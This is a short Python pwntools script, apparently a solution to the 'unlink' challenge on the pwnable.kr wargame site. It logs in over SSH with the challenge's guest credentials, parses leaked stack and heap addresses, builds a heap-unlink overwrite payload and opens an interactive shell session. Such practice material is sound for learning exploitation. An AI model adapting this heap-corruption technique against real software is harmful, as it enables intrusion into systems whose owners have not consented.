from pwn import *

ssh_connection = ssh(host='pwnable.kr', user='unlink', password='guest', port=2222)

process = ssh_connection.process('/home/unlink/unlink')

function = p32(0x080484eb)

pad = b'a' * 12

back = p32(int(process.recvline().decode().split()[-1], 16) + 0x10) # Stack address plus 0x10
front = p32(int(process.recvline().decode().split()[-1], 16) + 12)  # heap address plus 12

payload = function + pad + front + back

process.recvline() #  Remove the extra message
process.sendline(payload)

process.interactive()